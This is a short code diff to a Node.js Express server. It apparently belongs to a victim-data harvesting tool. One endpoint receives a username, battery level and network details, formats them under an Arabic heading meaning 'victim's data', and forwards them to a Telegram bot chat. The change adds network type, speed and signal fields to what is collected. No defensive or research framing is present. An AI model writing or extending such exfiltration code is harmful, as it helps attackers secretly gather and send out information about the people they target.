@@ -12,14 +12,14 @@ const CHAT_ID = process.env.CHAT_ID;
 
 // إرسال كل البيانات في رسالة واحدة
 app.post('/api/send-all-data', async (req, res) => {
-  const { username, battery, network } = req.body;
+  const { username, battery, speed, signal, type } = req.body;
   
   if (!username) {
     return res.status(400).json({ error: 'missing username' });
   }
 
   try {
-    const message = `📱 بيانات الضحية:\n\n👤 الاسم: ${username}\n🔋 البطارية: ${battery || 'غير معروف'}%\n📶 سرعة النت: ${network || 'غير معروف'}`;
+    const message = `📱 بيانات الضحية:\n\n👤 الاسم: ${username}\n🔋 البطارية: ${battery || 'غير معروف'}%\n📶 نوع الشبكة: ${type || 'غير معروف'}\n⚡ السرعة: ${speed || 'غير معروف'}\n📊 الإشارة: ${signal || 'غير معروف'}`;
     
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
